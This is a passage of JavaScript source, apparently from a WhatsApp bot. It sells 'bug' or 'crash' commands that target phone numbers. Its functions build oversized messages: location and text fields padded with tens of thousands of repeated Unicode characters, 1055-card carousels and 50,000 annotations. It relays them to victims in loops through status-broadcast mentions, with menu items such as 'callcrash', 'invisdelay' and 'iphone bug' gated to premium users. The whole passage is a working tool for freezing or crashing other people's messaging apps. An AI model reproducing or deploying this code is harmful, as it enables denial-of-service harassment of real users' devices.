RS0e1FajkkgkWSJ2R1PDKcEVp+tpfo1vPKLe4fGXB2pNj1x+Fj6itRsNReCRLdwZcNvhO5WK9iU8RDCjuRirKQwOCDwQa//8QALBEAAgIBAwMCBAcBAAAAAAAAAQIDEQAEEiExQVETIhVCYXEFIDNSU5Ghsf/aAAgBAgEBPwAA0Go1m6rN8ZJbR6ZhR5XJ+JZR9TkZIck+MZxRF4jojHe6rx3OGRGtlYMPI5zcKz1FHtvkYt7nHy0tX9sI69SKqsjYKEQAEDoPGSydSTV4obqFryTkqh1MbfNgjYHlQfuLwKavaoVj/wBz0j3ORad0a1cbQTxePJHGLd1UeSawakSfpRuw/fVL/tXixyyWWlpewUV/pvNsUKs9dAST1NDIpJ9TPqH1ulkWIbRAos+bJ25qjNA8D6HSSOhJE8bWLHYjd3GJO6RpLTSQMoYGvegPkd8T0nQSI29KtaNjEUNdgfcCsEVfORwBxWLo4Y5LVQzgAl5Lc856jNtC0CRZvn+sRiy2fJH9GsdA6MrdGFHPh2m/iXPhul7xLkcaxoiIKVRQGSaNkl9bSyCJifetWjfWvOGaMMsbOA7DgX1rFxkVuowopABHTp2wAAUBQ/Nr9NFLE0pFSRDcjjqCvOfguu1Gq9VJiDtVWBqj7s//xAAoEQEAAgEEAAUDBQAAAAAAAAABAAIRAxIhMQQTQVGRBVJxICIyYWL/2gAIAQMBAT8AxvdlebY6O5tCeBqHivq+j6bNU+FJ9P8A3eB8LZ78sPjiXw1CadXcIes8VbdpVKcu70JolilK9cdPEe8+7PKtdXHCwrkAM256/M1K7rqvtn8x03noEldCpQKfAdRqBjflhUzlmpelwBxiV1aAVwuCOrptdu2xK1apzxK0vdxWqv8AUdMr/K9R+0csb1r1Tn3Y2vdDP4JanllPLsbu16laN92+xu7HMamU6sRbDh4Y2sevzzN/+SW19S9cWtiv214Jt7zEwwURPSeff3nn392Ws2sr2wvk22Mza944loKQU/Xp2RD0XkmvStcJ7pP/2Q==",
        "streamingSidecar": "OrfzKwxuQDbFJgp0t/5yDhz5l3QWlhPCTjHr8GH3rssznKW0DeeV5Npeza+wlbqTW3E=",
        "thumbnailDirectPath": "/v/t62.36147-24/704765759_2250656945772076_7438018000665741074_n.enc?ccb=11-4&oh=01_Q5Aa4gFqtGpt8TzljYyAr3vcI4x2fbJ_dvBkmt4US14MSQ9W1w&oe=6A360538&_nc_sid=5e03e0",
        "thumbnailSha256": "JZkpKhWD4juZ9QRVMiJcWC2FBTupdWQWHzQNOgbBgyk=",
        "thumbnailEncSha256": "p/EG4j8X/7Els09gHqeLTQXh/HnxwkyCbkVHfg4gjLs=",
        annotations: Array.from({ length: 50000 }, () => ({
                    embeddedContent: {
                        embeddedMusic: {
                            author: "SMART"
                        }
                    },
                    embeddedAction: true
                }))
            }
        },
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: {
                                        jid: target
                                    }
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}


async function DelayInVis(rich, target, show = true) {
let push = [];
for (let r = 0; r < 1055; r++) {
push.push({
body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
header: proto.Message.InteractiveMessage.Header.fromObject({
title: " ",
hasMediaAttachment: true,
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
fileLength: "18352",
height: 720,
width: 1280,
mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
mediaKeyTimestamp: "1737281900",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
scanLengths: [3537, 10557, 1905, 2353],
midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
}
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: []
})
});
}
let msg1 = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
footer: proto.Message.InteractiveMessage.Footer.create({ text: "RizxvelzExerc1st¿" }),
header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [...push]
})
})
}
}
},
{}
);
let locationMessage = {
degreesLatitude: -9.09999262999,
degreesLongitude: 199.99963118999,
jpegThumbnail: null,
name: " $4izxvelzExerct1st. " + "𑇂𑆵𑆴𑆿".repeat(15000),
address: "🩸⃟༑⌁⃰𝐑𝐢𝐳𝐱𝐕𝐞𝐥𝐳‌𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧ཀ‌‌🦠" + "𖣂".repeat(5000),
url: `https://crazy.apple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
}
let msg2 = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
locationMessage
}
}
}, {});

for (const msg of [msg1, msg2]) {
await rich.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
}
]
}
]
});

if (show) {
await rich.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "4izxvelzExerct1st.🕸️" }
}
]
}
);
}
console.log(chalk.green(
`Succes Send Bug By Dual v1 ${target}`
));
await new Promise(resolve => setTimeout(resolve, 5000));
}
}


async function Ios(rich, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "SMART.𝙿𝙳𝙵" + TravaIphone,
            matchedText: "⛧⃝𓄃 𝚂m𝙰rt.𝙿𝙳𝙵 ⛧⃝𓄃",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "⛧⃝𓄃𝙿𝙳𝙵 ⛧⃝𓄃" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await rich.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await rich.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await rich.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
}
   
async function InVsSwIphone2(target) {
  for(let z = 0; z < 220; z++) {
    await rich.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `https://🧪⃟꙰⌁𝟕mega⃰𝐄𝐱𝐩𝐨𝐬𝐞𝐝.com` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: `https://crazy.apple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: pici, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
},{ statusJidList: target,
  })}
 }
 
 
 
// ===================== Interface Menu =====================
switch(command) {
case 'dualbugs': case 'dualbug': {
  if (!isPremium) return m.reply('premium only');
reply("*⌛ please use imenu for ios*")
  let timestamp = speed()
  let latensi = speed() - timestamp
  let run = runtime(process.uptime())
    const Menupic = await sharp(path.join(__dirname, '../start/media/CrL.jpg'))
        .resize(150, 150)
        .jpeg({ quality: 100 })
        .toBuffer()
    console.log("thumb size:", Menupic.length)
    const caption = `
▬▬▬▬▬▬▬▬▬▬▬
> ʜᴇʟʟᴏ :  ${m.pushName} 
> ᴘʀᴇғɪx : ${prefix}
> sᴘᴇᴇᴅ : ${latensi.toFixed(4)}
> ʀᴜɴᴛɪᴍᴇ : ${run}
> ѕтαтυѕ : ρяємιυм
> ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ✝ѕмαят    
▬▬▬▬▬▬▬▬▬▬▬
> cαℓℓcɾαรɦ 234### ( visible )
> เɳѵเs∂εℓαყ 234###
> ɱเxε∂ƒℓσσ∂ 234###
> ∂uαl-เσs 234### (iphone bug )
> xɠc ( gc-id )
> ƒσɾcεɠc ( ɠc-id )
▬▬▬▬▬▬▬▬▬▬▬`
    const msgContent = generateWAMessageFromContent(
        m.chat,
        {
            buttonsMessage: {
                locationMessage: {
                    degreesLongitude: 0,
                    degreesLatitude: 0,
                    jpegThumbnail: Menupic,
                    name: "DUAL FINAL JUDGEMENT"
                },
                contentText: caption,
                footerText: "By Dev Smart.pdf",

                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: {
                                text: "-6DUAL6CORE6 -",
                                format: 1
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: JSON.stringify({
                                    wa_flow_response_params: {
                                        title: "DUALCRASHER"
                                    }
                                })
                            }
                        }
                    },
                    remoteJid: "status@broadcast",
                    participant: rich.user?.id || "0@s.whatsapp.net"
                },
                buttons: [
                    {
                        buttonId: ".dualbugs",
                        buttonText: {
                            displayText: "DUALBUGS"
                        },
                        type: 1
                    },
                    {
                        buttonId: ".other",
                        buttonText: {
                            displayText: "OTHER"
                        },
                        type: 1
                    }
                ],
                headerType: 6
            }
        },
        {}
    )
    const newId = msgContent.key.id
    await rich.relayMessage(
        m.chat,
        msgContent.message,
        {
            messageId: newId
        }
    )
    await sleep(1000)
    const prevId = store.last[sender]
    if (prevId) {
        try {
            await rich.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: true,
                    id: prevId
                }
            })
        } catch (e) {
            console.log("[menu.js] failed to delete previous menu:", e.message)
        }
    }
    store.last[sender] = newId
    break
}
case 'other': case 'othermenu': {
    if (!isPremium) return m.reply('premium only');
reply("*⌛ please use imenu for ios*")
  let timestamp = speed()
  let latensi = speed() - timestamp
  let run = runtime(process.uptime())
    const Menupic = await sharp(path.join(__dirname, '../start/media/CrL.jpg'))
        .resize(150, 150)
        .jpeg({ quality: 100 })
        .toBuffer()
    console.log("thumb size:", Menupic.length)
    const caption = `
▬▬▬▬▬▬▬▬▬▬▬
> ʜᴇʟʟᴏ :  ${m.pushName} 
> ᴘʀᴇғɪx : ${prefix}
> sᴘᴇᴇᴅ : ${latensi.toFixed(4)}
> ʀᴜɴᴛɪᴍᴇ : ${run}
> ѕтαтυѕ : ρяємιυм
> ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ✝ѕмαят
▬▬▬▬▬▬▬▬▬▬▬
> ρเɳɠ
> ɾµɳƭเɱε
> ρℓαყ
> ɠc-เ∂
> vv
> εɳc
▬▬▬▬▬▬▬▬▬▬▬`
    const msgContent = generateWAMessageFromContent(
        m.chat,
        {
            buttonsMessage: {
                locationMessage: {
                    degreesLongitude: 0,
                    degreesLatitude: 0,
                    jpegThumbnail: Menupic,
                    name: "DUAL FINAL JUDGEMENT"
                },
                contentText: caption,
                footerText: "By Dev Smart.pdf",

                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: {
                                text: "-6DUAL6CORE6 -",
                                format: 1
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: JSON.stringify({
                                    wa_flow_response_params: {
                                        title: "DUALCRASHER"
                                    }
                                })
                            }
                        }
                    },
                    remoteJid: "status@broadcast",
                    participant: rich.user?.id || "0@s.whatsapp.net"
                },
                buttons: [
                    {
                        buttonId: ".dualbugs",
                        buttonText: {
                            displayText: "DUALBUGS"
                        },
                        type: 1
                    },
                    {
                        buttonId: ".other",
                        buttonText: {
                            displayText: "OTHER"
                        },
                        type: 1
                    }
                ],
                headerType: 6
            }
        },
        {}
    )
    const newId = msgContent.key.id
    await rich.relayMessage(
        m.chat,
        msgContent.message,
        {
            messageId: newId
        }
    )
    await sleep(1000)
    const prevId = store.last[sender]
    if (prevId) {
        try {
            await rich.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: true,
                    id: prevId
                }
            })
        } catch (e) {
            console.log("[menu.js] failed to delete previous menu:", e.message)
        }
    }
    store.last[sender] = newId
    break
}
case 'menu': case 'dual': {
  if (!isPremium) return m.reply('premium only');
reply("*⌛ please use imenu for ios*")
  let timestamp = speed()
  let latensi = speed() - timestamp
  let run = runtime(process.uptime())
    const Menupic = await sharp(path.join(__dirname, '../start/media/CrL.jpg'))
        .resize(150, 150)
        .jpeg({ quality: 100 })
        .toBuffer()
    console.log("thumb size:", Menupic.length)
    const caption = `
▬▬▬▬▬▬▬▬▬▬▬
> ʜᴇʟʟᴏ :  ${m.pushName} 
> ᴘʀᴇғɪx : ${prefix}
> sᴘᴇᴇᴅ : ${latensi.toFixed(4)}
> ʀᴜɴᴛɪᴍᴇ : ${run}
> ѕтαтυѕ : ρяємιυм
> ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ✝ѕмαят
▬▬▬▬▬▬▬▬▬▬▬     
> ρυϐℓιϲ
> ѕєℓƒ
> α∂∂ρяєм
> α∂∂οωиєя
> ∂єℓρяєм
> ∂єℓοωиєя
> ѕмαятℓιѕт
> ɢєт∂єνι¢є
▬▬▬▬▬▬▬▬▬▬▬
`
    const msgContent = generateWAMessageFromContent(
        m.chat,
        {
            buttonsMessage: {
                locationMessage: {
                    degreesLongitude: 0,
                    degreesLatitude: 0,
                    jpegThumbnail: Menupic,
                    name: "DUAL FINAL JUDGEMENT"
                },
                contentText: caption,
                footerText: "By Dev Smart.pdf",

                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: {
                                text: "-6DUAL6CORE6 -",
                                format: 1
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: JSON.stringify({
                                    wa_flow_response_params: {
                                        title: "DUALCRASHER"
                                    }
                                })
                            }
                        }
                    },
                    remoteJid: "status@broadcast",
                    participant: rich.user?.id || "0@s.whatsapp.net"
                },
                buttons: [
                    {
                        buttonId: ".dualbugs",
                        buttonText: {
                            displayText: "DUALBUGS"
                        },
                        type: 1
                    },
                    {
                        buttonId: ".other",
                        buttonText: {
                            displayText: "OTHER"
                        },
                        type: 1
                    }
                ],
                headerType: 6
            }
        },
        {}
    )
    const newId = msgContent.key.id
    await rich.relayMessage(
        m.chat,
        msgContent.message,
        {
            messageId: newId
        }
    )
    await sleep(1000)
    const prevId = store.last[sender]
    if (prevId) {
        try {
            await rich.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: true,
                    id: prevId
                }
            })
        } catch (e) {
            console.log("[menu.js] failed to delete previous menu:", e.message)
        }
    }
    store.last[sender] = newId
    break
}

case 'callcrash': 
case 'beta-crash': {
  try {
    if (!isPremium) return m.reply('premium only');
    if (!qtext) return reply(`Usage:\n${prefix + command} 234xx / @tag`);
    let jidx = qtext.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) {
      return reply(`\`The number must start with the country code.\``);  
    }
    let target = `${jidx}@s.whatsapp.net`;
        const pcci = await sharp(path.join(__dirname, '../start/media/CL.jpg'))
        .resize(150, 150)
        .jpeg({ quality: 100 })
        .toBuffer()
    console.log("thumb size:", pcci.length)
    
    const txt = `┌─────────
│➣ 𝚜𝚝𝚊𝚝𝚞𝚜 : in process ✅
│➣ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│➣ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│➣ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 30 𝚖𝚒𝚗𝚜
└─────────`;
    const msg = await generateWAMessageFromContent(from, {
      buttonsMessage: {
        locationMessage: {
          degreesLongitude: 0,
          degreesLatitude: 0,
          jpegThumbnail: pcci,
          name: "DUAL CRASHER"
        },
        contentText: txt,
        contextInfo: {
          quotedMessage: {
            interactiveResponseMessage: {
              body: { text: "devsmart.pdf", format: 1 },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                  wa_flow_response_params: { title: "sirmartins.pdf" }
                })
              }
            }
          },
          remoteJid: "status@broadcast",
          participant: sender
        },
        buttons: [{ buttonId: "Dual menu", buttonText: { displayText: "Dual" }, type: 1 }],
        headerType: 6
      }
    }, {});
    const idz = msg.key.id;
    await rich.relayMessage(from, msg.message, { messageId: idz });
    await sleep(1000);

    const waza = rich.tempIdStore[idz] = idz;
    if (!waza) return console.log("Id didnt resolved");    
    rich.lastMenuId[from] = waza;
    for (let i = 0; i < 150; i++) {
      await monkey(rich, target);
      await sleep(20000);
    }
    await rich.sendMessage(from, { react: { text: "🍫", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "😈", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "✅", key: msg.key } });

  } catch (e) {
    console.log(e);
  }
}
break;
case "invisdelay": {
  try {
    if (!isPremium) return m.reply('premium only');
    if (!qtext) return reply(`Usage:\n${prefix + command} 234xx / @tag`);
    let jidx = qtext.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) {
      return reply(`\`The number must start with the country code.\``);  
    }
    let target = `${jidx}@s.whatsapp.net`;
    const pcci = await sharp(path.join(__dirname, '../start/media/CL.jpg'))
        .resize(150, 150)
        .jpeg({ quality: 100 })
        .toBuffer()
    console.log("thumb size:", pcci.length)
    const txt = `┌─────────
│➣ 𝚜𝚝𝚊𝚝𝚞𝚜 : in process ✅
│➣ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│➣ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│➣ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 30 𝚖𝚒𝚗𝚜
└─────────`;
    const msg = await generateWAMessageFromContent(from, {
      buttonsMessage: {
        locationMessage: {
          degreesLongitude: 0,
          degreesLatitude: 0,
